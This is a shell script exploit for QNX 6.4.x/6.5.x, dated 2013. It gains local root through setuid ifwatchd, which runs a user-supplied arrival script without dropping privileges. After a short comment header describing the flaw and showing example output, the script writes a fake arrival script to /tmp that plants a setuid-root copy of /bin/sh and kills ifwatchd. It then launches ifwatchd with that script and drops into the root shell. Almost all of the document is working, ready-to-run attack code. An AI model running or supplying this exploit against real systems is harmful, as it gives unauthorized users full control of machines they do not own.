#!/bin/sh
#
#        QNX 6.4.x/6.5.x ifwatchd local root exploit by cenobyte 2013
#                         <vincitamorpatriae@gmail.com>
#
# - vulnerability description:
# Setuid root ifwatchd watches for addresses added to or deleted from network
# interfaces and calls up/down scripts for them. Any user can launch ifwatchd
# and provide arbitrary up/down scripts. Unfortunately ifwatchd does not drop
# privileges when executing user supplied scripts.
#
# - vulnerable platforms:
# QNX 6.5.0SP1
# QNX 6.5.0
# QNX 6.4.1
#
# - exploit description:
# This exploit creates a fake arrival-script which will be executed as root by
# passing it to the -A parameter of /sbin/ifwatchd. The fake arrival-script
# copies /bin/sh to /tmp/shell and makes it setuid root. Once the setuid shell
# is in place ifwatchd will be killed to drop the user into the root shell.
#
# - example:
# $ uname -a
# QNX localhost 6.5.0 2010/07/09-14:44:03EDT x86pc x86
# $ id
# uid=100(user) gid=100
# $ ./qnx-ifwatchd.sh
# QNX 6.4.x/6.5.x ifwatchd local root exploit by cenobyte 2013
#
# [-] creating fake arrival-script
# [-] executing ifwatchd, please wait
# Killed
# [-] now executing suid shell
# # id
# uid=100(user) gid=100 euid=0(root)

PATH=/bin:/usr/bin:/sbin

if [ ! -x /sbin/ifwatchd ]; then
	echo "error: cannot execute /sbin/ifwatchd"
	exit 1
fi

echo "QNX 6.4.x/6.5.x ifwatchd local root exploit by cenobyte 2013"
echo
echo "[-] creating fake arrival-script"
cat << _EOF_ > /tmp/0
#!/bin/sh
PATH=/bin:/usr/bin
IFWPID=\$(ps -edaf | grep "ifwatchd -A" | awk '!/grep/ { print \$2 }')
cp /bin/sh /tmp/shell
chown root:root /tmp/shell
chmod 4755 /tmp/shell
rm -f /tmp/0
kill -9 \$IFWPID
exit 0
_EOF_

chmod +x /tmp/0

echo "[-] executing ifwatchd, please wait"
ifwatchd -A /tmp/0 -v lo0 2>&1 >/dev/null
echo "[-] now executing suid shell"
/tmp/shell